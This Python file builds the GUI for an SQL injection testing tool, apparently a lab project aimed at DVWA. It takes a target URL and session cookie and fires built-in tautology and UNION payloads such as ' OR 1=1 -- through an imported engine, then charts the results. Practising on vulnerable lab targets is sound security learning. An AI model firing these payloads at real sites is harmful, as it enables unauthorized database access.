import customtkinter as ctk
import json
import os
import threading
from core.engine import SQLiEngine
from core.miner import SQLiMiner
from gui.dashboard import CyberChart

ctk.set_appearance_mode("Dark")

class CyberSQLiApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("SQLYZER CENTER")
        self.geometry("1100x700")
        self.configure(fg_color="#0B0B0C")

        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        # --- Sidebar Panel ---
        self.sidebar = ctk.CTkFrame(self, width=250, fg_color="#121212", corner_radius=0)
        self.sidebar.grid(row=0, column=0, sticky="nsew")

        ctk.CTkLabel(self.sidebar, text="SQLYZER", font=("Courier", 26, "bold"), text_color="#00FF41").pack(pady=30)

        self.target_entry = ctk.CTkEntry(self.sidebar, placeholder_text="Target URL (DVWA)", font=("Courier", 18, "bold"), width=200, fg_color="#1F1F1F", border_color="#333333")
        self.target_entry.pack(pady=10, padx=20)

        self.cookie_entry = ctk.CTkEntry(self.sidebar, placeholder_text="PHPSESSID Cookie", font=("Courier", 18, "bold"), width=200, fg_color="#1F1F1F", border_color="#333333")
        self.cookie_entry.pack(pady=10, padx=20)

        self.execute_btn = ctk.CTkButton(self.sidebar, text="EXECUTE BREACH", fg_color="#00FF41", font=("Courier", 24, "bold"), text_color="black", hover_color="#00B32C", command=self.trigger_attack)
        self.execute_btn.pack(pady=30, padx=20)

        self.status_led = ctk.CTkLabel(self.sidebar, text="[ STATUS: IDLE ]", text_color="gray", font=("Courier", 16))
        self.status_led.pack(side="bottom", pady=20)

        # --- Dashboard Workspace ---
        self.workspace = ctk.CTkFrame(self, fg_color="transparent")
        self.workspace.grid(row=0, column=1, sticky="nsew", padx=20, pady=20)

        # Matplotlib Graph View
        self.graph_view = CyberChart(self.workspace)
        self.graph_view.pack(fill="both", expand=True, pady=(0, 20))

        # Cyber Terminal Output
        self.terminal = ctk.CTkTextbox(self.workspace, fg_color="#000000", text_color="#00FF41", font=("Courier", 14), border_color="#00FF41", border_width=1)
        self.terminal.pack(fill="both", expand=True)
        self.terminal.insert("0.0", "[SYS_INIT] Hyper-threading initialized. CPU bound logic ready.\n")

    def trigger_attack(self):
        target = self.target_entry.get()
        cookie = self.cookie_entry.get()

        if not target:
            self.terminal.insert("end", "[ERROR] Target specification missing.\n")
            return

        self.status_led.configure(text="[ STATUS: ACTIVE ]", text_color="#00FF41")
        self.terminal.insert("end", f"\n[LAUNCH] Firing multi-vector payloads at {target}...\n")
        
        # Run in thread so the UI does not freeze
        threading.Thread(target=self.run_process, args=(target, cookie), daemon=True).start()

    def run_process(self, target, cookie):
        # 1. Safety Net: Ensure data directory and payloads exist
        payload_path = "data/payloads.json"
        if not os.path.exists("data"):
            os.makedirs("data", exist_ok=True)
            
        if not os.path.exists(payload_path):
            self.terminal.insert("end", "[WARN] payloads.json not found. Creating default vectors.\n")
            default_payloads = {
                "generic_tautology": ["' OR 1=1 --", "admin' --", "' OR '1'='1"],
                "union_discovery": ["' UNION SELECT 1,2,3 --", "' UNION SELECT NULL,NULL --"]
            }
            with open(payload_path, "w") as f:
                json.dump(default_payloads, f, indent=4)

        # 2. Load Payloads
        try:
            with open(payload_path, "r") as f:
                payloads = json.load(f)
        except Exception as e:
            self.terminal.insert("end", f"[ERROR] Failed to load payloads: {e}\n")
            return

        # 3. Run Engine (Execution)
        engine = SQLiEngine(target, cookie)
        log_path = engine.fire_payloads(payloads)

        # 4. Mine Data (Analysis)
        miner = SQLiMiner(log_path)
        stats = miner.get_summary_stats()
        success_df = miner.analyze_success_rates() # These are the anomalies
        full_df = miner.df # This is the complete dataset

        # 5. Update UI (Results)
        self.terminal.insert("end", f"[INFO] Logs written to {log_path}\n")
        self.terminal.insert("end", f"[SUCCESS] Packets: {stats['total_attempts']} | Anomalies: {stats['anomalies_detected']}\n")
        
        # Pass both DataFrames to show detailed info
        self.graph_view.update_chart(full_df, success_df)
        self.status_led.configure(text="[ STATUS: COMPLETE ]", text_color="#00FF41")

if __name__ == "__main__":
    # Ensure campaigns directory exists for logging
    os.makedirs("data/campaigns", exist_ok=True)
    
    app = CyberSQLiApp()
    app.mainloop()